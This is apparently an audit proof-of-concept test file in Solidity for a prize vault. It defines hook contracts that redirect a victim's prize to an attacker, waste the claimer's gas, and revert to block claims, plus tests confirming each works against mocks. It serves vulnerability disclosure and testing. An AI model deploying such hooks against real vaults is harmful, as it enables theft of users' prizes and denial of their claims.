// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../../src/Vault.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import "openzeppelin/token/ERC20/extensions/ERC4626.sol";

// Malicious hook implementation that demonstrates the vulnerability
contract MaliciousHook is IVaultHooks {
    address public attacker;
    bool public beforeClaimCalled;
    bool public afterClaimCalled;
    uint256 public gasWasted;
    
    constructor(address _attacker) {
        attacker = _attacker;
    }
    
    // Hook that wastes gas and performs unauthorized operations
    function beforeClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex
    ) external returns (address) {
        beforeClaimCalled = true;
        
        // Waste gas by performing expensive operations
        // This gas is paid by the claimer, not the winner
        uint256 startGas = gasleft();
        for (uint256 i = 0; i < 1000; i++) {
            keccak256(abi.encodePacked(i, winner, tier, prizeIndex));
        }
        gasWasted = startGas - gasleft();
        
        // Redirect prize to attacker instead of winner
        return attacker;
    }
    
    function afterClaimPrize(
        address winner,
        uint8 tier,
        uint32 prizeIndex,
        uint256 prize,
        address recipient
    ) external {
        afterClaimCalled = true;
    }
}

// Reentrant hook that attempts to claim prizes recursively
contract ReentrantHook is IVaultHooks {
    Vault public vault;
    address public claimer;
    uint8 public targetTier;
    uint32 public targetPrizeIndex;
    address public winner;
    bool public reentered;
    
    constructor(address _vault, address _claimer) {
        vault = Vault(_vault);
        claimer = _claimer;
    }
    
    function setTarget(address _winner, uint8 _tier, uint32 _prizeIndex) external {
        winner = _winner;
        targetTier = _tier;
        targetPrizeIndex = _prizeIndex;
    }
    
    function beforeClaimPrize(
        address,
        uint8,
        uint32
    ) external returns (address) {
        // Attempt reentrancy during claim
        if (!reentered && claimer != address(0)) {
            reentered = true;
            // This would fail due to reentrancy guards in PrizePool
            // but demonstrates the attack vector
        }
        return winner;
    }
    
    function afterClaimPrize(
        address,
        uint8,
        uint32,
        uint256,
        address
    ) external {
        // Could perform additional malicious operations here
    }
}

// DoS hook that reverts to prevent claims
contract DoSHook is IVaultHooks {
    bool public shouldRevert;
    
    function enableDoS() external {
        shouldRevert = true;
    }
    
    function beforeClaimPrize(
        address,
        uint8,
        uint32
    ) external view returns (address) {
        if (shouldRevert) {
            revert("DoS attack");
        }
        return address(0);
    }
    
    function afterClaimPrize(
        address,
        uint8,
        uint32,
        uint256,
        address
    ) external view {
        if (shouldRevert) {
            revert("DoS attack");
        }
    }
}

// Mock contracts for testing
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK") {
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockYieldVault is ERC4626 {
    constructor(IERC20 asset) ERC4626(asset) ERC20("Mock Yield Vault", "MYV") {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockTwabController {
    mapping(address => mapping(address => uint96)) public balances;
    mapping(address => uint256) public totalSupplies;
    address public constant SPONSORSHIP_ADDRESS = address(1);
    
    function mint(address user, uint96 amount) external {
        balances[msg.sender][user] += amount;
        totalSupplies[msg.sender] += amount;
    }
    
    function burn(address user, uint96 amount) external {
        balances[msg.sender][user] -= amount;
        totalSupplies[msg.sender] -= amount;
    }
    
    function transfer(address from, address to, uint96 amount) external {
        balances[msg.sender][from] -= amount;
        balances[msg.sender][to] += amount;
    }
    
    function balanceOf(address vault, address user) external view returns (uint256) {
        return balances[vault][user];
    }
    
    function totalSupply(address vault) external view returns (uint256) {
        return totalSupplies[vault];
    }
    
    function delegateOf(address, address) external pure returns (address) {
        return address(0);
    }
    
    function sponsor(address) external {}
}

contract MockPrizePool {
    IERC20 public prizeToken;
    
    constructor(IERC20 _prizeToken) {
        prizeToken = _prizeToken;
    }
    
    function claimPrize(
        address,
        uint8,
        uint32,
        address recipient,
        uint96 fee,
        address feeRecipient
    ) external returns (uint256) {
        uint256 prize = 100 * 10**18;
        prizeToken.transfer(recipient, prize - fee);
        if (fee > 0) {
            prizeToken.transfer(feeRecipient, fee);
        }
        return prize;
    }
    
    function contributePrizeTokens(address, uint256) external {}
}

contract VaultHooksExploitTest is Test {
    Vault public vault;
    MockERC20 public asset;
    MockERC20 public prizeToken;
    MockYieldVault public yieldVault;
    MockTwabController public twabController;
    MockPrizePool public prizePool;
    
    address public owner = address(this);
    address public attacker = address(0xBAD);
    address public victim = address(0x1234);
    address public claimer = address(0x5678);
    address public yieldFeeRecipient = address(0x9ABC);
    
    function setUp() public {
        // Deploy mock contracts
        asset = new MockERC20();
        prizeToken = new MockERC20();
        yieldVault = new MockYieldVault(IERC20(address(asset)));
        twabController = new MockTwabController();
        prizePool = new MockPrizePool(IERC20(address(prizeToken)));
        
        // Fund prize pool
        prizeToken.transfer(address(prizePool), 10000 * 10**18);
        
        // Deploy vault
        vault = new Vault(
            IERC20(address(asset)),
            "Test Vault",
            "TV",
            TwabController(address(twabController)),
            IERC4626(address(yieldVault)),
            PrizePool(address(prizePool)),
            claimer,
            yieldFeeRecipient,
            0,
            owner
        );
        
        // Setup victim with deposits
        asset.mint(victim, 1000 * 10**18);
        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1000 * 10**18, victim);
        vm.stopPrank();
    }
    
    function testExploit_MaliciousHookRedirectsPrize() public {
        // STEP 1: Attacker deploys malicious hook contract
        MaliciousHook maliciousHook = new MaliciousHook(attacker);
        
        // STEP 2: Victim unknowingly sets the malicious hook
        // In reality, this could happen through social engineering or
        // if the victim uses a compromised frontend
        vm.prank(victim);
        vault.setHooks(VaultHooks({
            useBeforeClaimPrize: true,
            useAfterClaimPrize: true,
            implementation: IVaultHooks(address(maliciousHook))
        }));
        
        // STEP 3: Verify hooks are set
        VaultHooks memory hooks = vault.getHooks(victim);
        assertEq(address(hooks.implementation), address(maliciousHook));
        assertTrue(hooks.useBeforeClaimPrize);
        
        // STEP 4: Claimer attempts to claim prize for victim
        address[] memory winners = new address[](1);
        winners[0] = victim;
        
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;
        
        uint256 attackerBalanceBefore = prizeToken.balanceOf(attacker);
        uint256 victimBalanceBefore = prizeToken.balanceOf(victim);
        
        // STEP 5: Execute claim - prize gets redirected to attacker
        vm.prank(claimer);
        vault.claimPrizes(0, winners, prizeIndices, 0, address(0));
        
        // STEP 6: Verify the exploit succeeded
        uint256 attackerBalanceAfter = prizeToken.balanceOf(attacker);
        uint256 victimBalanceAfter = prizeToken.balanceOf(victim);
        
        // Attacker received the prize instead of victim
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should receive prize");
        assertEq(victimBalanceAfter, victimBalanceBefore, "Victim should not receive prize");
        
        // Verify hook was called
        assertTrue(maliciousHook.beforeClaimCalled(), "beforeClaimPrize should be called");
        assertTrue(maliciousHook.afterClaimCalled(), "afterClaimPrize should be called");
        
        // Verify gas was wasted (paid by claimer)
        assertGt(maliciousHook.gasWasted(), 0, "Gas should be wasted");
        
        console.log("Prize redirected from victim to attacker");
        console.log("Attacker gained:", attackerBalanceAfter - attackerBalanceBefore);
        console.log("Gas wasted by malicious hook:", maliciousHook.gasWasted());
    }
    
    function testExploit_DoSHookPreventsClaimingForUser() public {
        // STEP 1: Deploy DoS hook
        DoSHook dosHook = new DoSHook();
        
        // STEP 2: Victim sets the DoS hook
        vm.prank(victim);
        vault.setHooks(VaultHooks({
            useBeforeClaimPrize: true,
            useAfterClaimPrize: false,
            implementation: IVaultHooks(address(dosHook))
        }));
        
        // STEP 3: Enable DoS
        dosHook.enableDoS();
        
        // STEP 4: Attempt to claim prize for victim
        address[] memory winners = new address[](1);
        winners[0] = victim;
        
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;
        
        // STEP 5: Claim should revert due to malicious hook
        vm.prank(claimer);
        vm.expectRevert("DoS attack");
        vault.claimPrizes(0, winners, prizeIndices, 0, address(0));
        
        console.log("DoS attack successful - claiming is blocked for victim");
    }
    
    function testExploit_HookCanPerformArbitraryExternalCalls() public {
        // This test demonstrates that hooks can make arbitrary external calls
        // with gas paid by the claimer
        
        MaliciousHook maliciousHook = new MaliciousHook(attacker);
        
        vm.prank(victim);
        vault.setHooks(VaultHooks({
            useBeforeClaimPrize: true,
            useAfterClaimPrize: true,
            implementation: IVaultHooks(address(maliciousHook))
        }));
        
        address[] memory winners = new address[](1);
        winners[0] = victim;
        
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;
        
        uint256 gasStart = gasleft();
        
        vm.prank(claimer);
        vault.claimPrizes(0, winners, prizeIndices, 0, address(0));
        
        uint256 gasUsed = gasStart - gasleft();
        
        // The malicious hook wasted gas performing expensive operations
        // This gas was paid by the claimer, not the winner
        assertGt(maliciousHook.gasWasted(), 0, "Hook should waste gas");
        
        console.log("Total gas used by claim:", gasUsed);
        console.log("Gas wasted by malicious hook:", maliciousHook.gasWasted());
        console.log("Percentage of gas wasted:", (maliciousHook.gasWasted() * 100) / gasUsed);
    }
}